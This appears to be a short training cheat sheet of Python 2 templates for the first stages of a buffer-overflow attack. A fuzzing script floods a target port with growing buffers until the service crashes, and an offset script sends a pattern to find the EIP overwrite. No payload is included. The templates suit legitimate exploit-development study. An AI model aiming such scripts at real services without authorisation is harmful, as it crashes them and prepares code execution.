### Python Templates for BOF

There are different stages of BOF and we'll have different scripts for each stage:

### Spiking & Fuzzing
```Python
#!/usr/bin/python

import socket,sys
from time import sleep

buffer = "A" * 100
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21 

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((RHOST,RPORT))
        s.send(buffer + '\r\n')
        s.close()
        sleep(1)
        buffer += "A" * 100
    except:
        print("Debugger crashed at %s bytes" % str(len(buffer)))
        sys.exit
```
### Offset
```Python
#!/usr/bin/python

import sys,socket
from time import sleep

buffer = #Based on at what bytes you get to EIP, generate your pattern and insert it here, example "AAAA"
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send(buffer + '\r\n')
    s.close()
except:
    print("Debugger crashed at %s bytes" % str(len(buffer)))
    sys.exit
```
